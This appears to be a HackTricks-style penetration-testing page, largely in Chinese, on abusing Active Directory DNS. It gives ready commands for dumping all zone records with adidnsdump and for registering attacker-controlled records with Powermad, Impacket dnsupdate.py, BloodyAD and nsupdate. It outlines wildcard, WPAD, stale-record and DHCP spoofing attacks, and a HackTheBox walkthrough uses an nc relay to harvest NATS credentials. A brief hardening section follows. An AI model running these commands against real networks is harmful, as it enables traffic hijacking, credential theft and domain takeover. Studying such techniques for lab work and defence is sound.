# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

默认情况下，Active Directory 中的 **任何用户** 可以在域或林的 DNS 区中 **枚举所有 DNS 记录**，类似于区域传送（用户可以列出 AD 环境中 DNS 区的子对象）。

工具 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) 可用于对区域中 **所有 DNS 记录** 进行 **枚举** 和 **导出**，用于内部网络的信息收集。
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) 添加了 JSON/Greppable (`--json`) 输出、多线程 DNS 解析以及在绑定到 LDAPS 时对 TLS 1.2/1.3 的支持

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Creating / Modifying records (ADIDNS spoofing)

因为 **Authenticated Users** 组默认在 zone DACL 上具有 **Create Child** 权限，任何域账号（或计算机账号）都可以注册额外的记录。 这可以用于流量劫持、NTLM relay coercion，甚至完全域妥协。

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py 随 Impacket ≥0.12.0 一起提供)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 常见攻击手段

1. **Wildcard record** – `*.<zone>` 将 AD DNS 服务器变成类似 LLMNR/NBNS 欺骗的企业级 responder。可被滥用以捕获 NTLM 哈希或将其中继到 LDAP/SMB。（需要禁用 WINS-lookup。）
2. **WPAD hijack** – 添加 `wpad`（或一个指向攻击者主机以绕过 Global-Query-Block-List 的 **NS** record），并透明地代理出站 HTTP 请求以收集凭证。Microsoft 修补了 wildcard/DNAME 绕过（CVE-2018-8320），但 **NS-records 仍然有效**。
3. **Stale entry takeover** – 声称先前属于某工作站的 IP 地址，相关的 DNS 条目仍然会解析，从而在无需修改 DNS 的情况下启用基于资源的受限委派或 Shadow-Credentials 攻击。
4. **DHCP → DNS spoofing** – 在默认 Windows DHCP+DNS 部署中，同一子网的未认证攻击者可以通过发送伪造的 DHCP 请求触发动态 DNS 更新（Akamai “DDSpoof”，2023），覆盖任何现有的 A record（包括 Domain Controllers）。这会导致对 Kerberos/LDAP 的机器中间人攻击并可能导致完整域接管。
5. **Certifried (CVE-2022-26923)** – 更改你控制的计算机账户的 `dNSHostName`，注册一个匹配的 A record，然后为该名称请求证书以冒充 DC。工具如 **Certipy** 或 **BloodyAD** 可以完全自动化此流程。

---

### 通过陈旧动态记录进行内部服务劫持（NATS case study）

当动态更新对所有已认证用户开放时，**一个已注销的服务名称可以被重新申领并指向攻击者基础设施**。Mirage HTB DC 在 DNS scavenging 后暴露了主机名 `nats-svc.mirage.htb`，因此任何低权限用户都可以：

1. **确认记录已丢失** 并使用 `dig` 获取 SOA：
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **重新创建该记录** 指向他们控制的外部/VPN 接口：
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS 客户端期望在发送 credentials 之前看到一个 `INFO { ... }` banner，因此从真实 broker 复制一个合法的 banner 就足以收集 secrets:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Pivot with the captured creds** – 在 Mirage 中，被盗的 NATS 帐户提供了 JetStream 访问，这暴露了包含可重用 AD 用户名/密码 的历史认证事件。

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## 检测与加固

* 拒绝 **Authenticated Users** 在敏感区域上的 *Create all child objects* 权限，并将动态更新委派给由 DHCP 使用的专用账户。
* 如果需要动态更新，将区域设置为 **Secure-only**，并在 DHCP 中启用 **Name Protection**，以便只有所属计算机对象可以覆盖其自己的记录。
* 监控 DNS Server 事件 ID 257/252 (dynamic update)、770 (zone transfer) 以及对 `CN=MicrosoftDNS,DC=DomainDnsZones` 的 LDAP 写入。
* 通过故意设置良性记录或使用 Global Query Block List 阻止危险名称 (`wpad`, `isatap`, `*`)。
* 保持 DNS 服务器打补丁 —— 例如，RCE 漏洞 CVE-2024-26224 和 CVE-2024-26231 达到 **CVSS 9.8**，并可远程利用针对 Domain Controllers。



## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, still the de-facto reference for wildcard/WPAD attacks)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
